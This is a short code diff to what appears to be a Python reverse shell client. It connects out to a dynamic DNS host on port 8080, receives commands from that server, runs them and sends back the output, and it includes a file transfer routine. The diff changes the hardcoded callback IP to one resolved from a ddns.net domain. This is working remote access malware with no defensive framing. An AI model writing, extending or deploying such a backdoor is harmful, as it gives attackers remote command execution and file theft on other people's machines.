@@ -17,9 +17,9 @@ def transfer(s, path):
     else:
         s.send("File not found".encode())
 
-def connect():
+def connect(ip):
     s = socket.socket()
-    s.connect(("192.168.25.56", 8080))
+    s.connect((ip, 8080))
     while True:
         # Gets input from server-side (1kb max)
         command = s.recv(1024)  
@@ -39,6 +39,8 @@ def connect():
             s.send(cmd_exe.stderr.read())
             
 def main():
-    connect()
+    ip = socket.gethostbyname("jakeoliverlee.ddns.net")
+    
+    connect(ip)
     
 main()
